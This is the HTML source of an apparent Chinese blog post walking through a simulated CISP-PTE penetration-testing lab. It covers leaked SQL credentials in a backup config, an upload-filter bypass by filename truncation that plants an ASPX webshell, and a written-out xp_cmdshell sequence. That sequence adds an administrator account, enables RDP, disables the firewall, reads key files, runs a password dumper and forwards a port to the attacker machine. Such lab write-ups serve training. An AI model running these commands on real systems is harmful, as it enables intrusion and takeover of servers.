@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>             模拟cisp-pte 综合题三个key | shadow&#39;s blog</title>
+<meta name="description" content="Long time no see.">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="shortcut icon" href="https://shadownb.github.io//favicon.ico?v=1605443835425">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="stylesheet" href="https://unpkg.com/papercss@1.6.1/dist/paper.min.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://shadownb.github.io//styles/main.css">
+
+
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+
+
+  </head>
+  <body>
+  
+    <nav class="navbar border fixed split-nav">
+  <div class="nav-brand">
+    <h3><a href="https://shadownb.github.io/">shadow&#39;s blog</a></h3>
+  </div>
+  <div class="collapsible">
+    <input id="collapsible1" type="checkbox" name="collapsible1">
+    <button>
+      <label for="collapsible1">
+        <div class="bar1"></div>
+        <div class="bar2"></div>
+        <div class="bar3"></div>
+      </label>
+    </button>
+    <div class="collapsible-body">
+      <ul class="inline">
+        
+          <li>
+            
+              <a href="/" class="menu">
+                首页
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="/archives" class="menu">
+                归档
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="/tags" class="menu">
+                标签
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="/post/about" class="menu">
+                关于
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="/post/you-lian/" class="menu">
+                友链
+              </a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div id="top" class="row site">
+      <div class="sm-12 md-8 col">
+        <div class="paper">
+          <article class="article">
+            <h1>             模拟cisp-pte 综合题三个key</h1>
+            <p class="article-meta">
+              2020-11-15
+              
+            </p>
+            
+            <div class="post-content">
+              <p>1.环境<br>
+靶机ip：192.168.1.139 本机：192.168.1.1</p>
+<p>2.利用御剑端口扫描<br>
+<img src="https://shadownb.github.io//post-images/1605437022240.png" alt=""><br>
+尝试一个个访问，发现只有27689可以访问<br>
+<img src="https://shadownb.github.io//post-images/1605437281065.png" alt=""><br>
+御剑目录扫描<br>
+<img src="https://shadownb.github.io//post-images/1605437770593.png" alt=""><br>
+尝试都访问一下，先访问robots.txt<br>
+<img src="https://shadownb.github.io//post-images/1605438365776.png" alt=""><br>
+在访问web.config.bak的时候这个文件可以下载，看到里面有sql的的用户名密码<br>
+<img src="https://shadownb.github.io//post-images/1605438913833.png" alt=""><br>
+用Navicat Premium连接数据库<br>
+<img src="https://shadownb.github.io//post-images/1605439114365.png" alt=""><br>
+在userlists表中找到了用户名密码，default.aspx网站中登录<br>
+<img src="https://shadownb.github.io//post-images/1605439357012.png" alt=""><br>
+这就拿到第一个key了。</p>
+<p>3.浏览一下这个网站看到有一个文件上传<br>
+<img src="https://shadownb.github.io//post-images/1605439435544.png" alt=""><br>
+准备上传一个.php后缀的，但是提示该文件不给上传，尝试绕过，管理上传有一句提示<br>
+<img src="https://shadownb.github.io//post-images/1605439693878.png" alt=""><br>
+文件名过长会被截取掉，由于该网站是aspx搭建的，就需要上传.aspx.jpg文件，又jpg文件不能被解析，利用文件名32个字符会被截掉这个特点，改文件名，使它刚好截掉.jpg这一段，然后webshell文件才会被解析<br>
+<img src="https://shadownb.github.io//post-images/1605440490239.png" alt=""><br>
+网站页面显示，刚好截断到.aspx<br>
+<img src="https://shadownb.github.io//post-images/1605440537932.png" alt=""><br>
+尝试蚁剑连接，在这里我卡在连接的路径了，开始怎么都连接不上，出题者不严谨，不知道affix哪里来的<br>
+<img src="https://shadownb.github.io//post-images/1605441101445.png" alt=""><br>
+成功连接，在web下找到第二个key<br>
+<img src="https://shadownb.github.io//post-images/1605441175511.png" alt=""></p>
+<p>4.在web目录下有一个和之前在网站下载的文件很像<br>
+<img src="https://shadownb.github.io//post-images/1605441263077.png" alt=""><br>
+打开来看，看到了sa，sql数据库的最高权限用户<br>
+<img src="https://shadownb.github.io//post-images/1605441881160.png" alt=""><br>
+<img src="https://shadownb.github.io//post-images/1605441856673.png" alt=""><br>
+在sql数据库中执行添加用户，并将用户添加进管理员组，并开启3389端口，关闭防火墙<br>
+<img src="https://shadownb.github.io//post-images/1605442032136.png" alt=""><br>
+搜索key即出现key3了<br>
+<img src="https://shadownb.github.io//post-images/1605442304344.png" alt=""></p>
+<p>第二种方法<br>
+<img src="https://shadownb.github.io//post-images/1605442385046.png" alt=""></p>
+<p>pte综合题做法</p>
+<p>USE master<br>
+RECONFIGURE<br>
+EXEC sp_configure 'show advanced options',1 --启用xp_cmdshell<br>
+RECONFIGURE<br>
+EXEC sp_configure 'xp_cmdshell',1  --打开xp_cmdshell,可以调用SQL系统之外命令</p>
+<p>RECONFIGURE<br>
+1.添加管理账户后开启远程桌面<br>
+建立系统用户<br>
+exec master..xp_cmdshell 'net user pte77 test666 /add'</p>
+<p>加入到管理员组<br>
+exec master..xp_cmdshell 'net localgroup administrators pte77 /add'</p>
+<p>执行脚本<br>
+exec master..xp_cmdshell 'cmd.exe /C D:\web\3389.bat'<br>
+exec master..xp_cmdshell 'netstat -anop tcp | find &quot;3389&quot;'<br>
+exec xp_cmdshell 'netsh firewall set opmode disable' 关闭防火墙</p>
+<p>方法2<br>
+2.直接type查看key文件<br>
+exec master..xp_cmdshell 'dir &quot;C:\Documents and Settings\Administrator\桌面&quot; /A -D /B'</p>
+<p>exec xp_cmdshell 'type &quot;C:\Documents and Settings\Administrator\桌面\key.txt&quot;'</p>
+<p>方法3 如果写不了用户 那就读账号密码<br>
+exec xp_cmdshell 'd:\oa\GetPass.exe'</p>
+<p>端口转发：<br>
+exec xmd_shell 'd:\web\lcx.exe -slave 攻击机ip 2222 127.0.0.1 3389'</p>
+
+            </div>
+          </article>
+        </div>
+        <div class="paper" data-aos="fade-in">
+          
+            <div class="next-post">
+              <div class="next">
+                下一篇
+              </div>
+              <a href="https://shadownb.github.io//post/upload-labs">
+                <h3 class="post-title">
+                                        upload-labs
+                </h3>
+              </a>
+            </div>
+          
+        </div>
+        
+      </div>
+
+      <div class="sm-12 md-4 col sidebar">
+  <div class="paper info-container">
+    <img src="https://shadownb.github.io//images/avatar.png?v=1605443835425" class="no-responsive avatar">
+    <div class="text-muted">Long time no see.</div>
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  </div>
+  <div class="paper">
+    <div class="sidebar-title">
+      最新文章
+    </div>
+    <div class="row">
+      <ul>
+        
+          
+            <li>
+              <a href="https://shadownb.github.io//post/day6-zuo-ti">                  day6-做题</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://shadownb.github.io//post/mo-ni-cisp-pte-zong-he-ti-san-ge-key">             模拟cisp-pte 综合题三个key</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://shadownb.github.io//post/upload-labs">                      upload-labs</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://shadownb.github.io//post/phpmyadmin-yuan-cheng-dai-ma-zhi-xing-lou-dong">       phpmyadmin远程代码执行漏洞</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://shadownb.github.io//post/python-format">python</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://shadownb.github.io//post/jis-ctf-ba-ji-shen-tou">                     JIS-CTF靶机渗透</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://shadownb.github.io//post/6667-duan-kou-msf">       metasploitable2各端口渗透</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://shadownb.github.io//post/wen-jian-bao-han">                 文件包含</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://shadownb.github.io//post/dvwa-zhi-ming-ling-zhu-ru">          DVWA之命令注入</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://shadownb.github.io//post/ms17-010">                ms17-010</a>
+            </li>
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      </ul>
+    </div>
+  </div>
+  <div class="paper">
+    <div class="sidebar-title">
+      标签列表
+    </div>
+    <div class="row">
+      
+        <a href="https://shadownb.github.io//tag/z3TcqWale" class="badge secondary">
+          Gridea
+        </a>
+      
+    </div>
+  </div>
+  <div class="paper">
+    Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://shadownb.github.io//atom.xml" target="_blank">RSS</a>
+  </div>
+</div>
+
+
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+
+<script type="application/javascript">
+
+AOS.init();
+
+hljs.initHighlightingOnLoad()
+
+</script>
+
+
+
+
+  </body>
+</html>
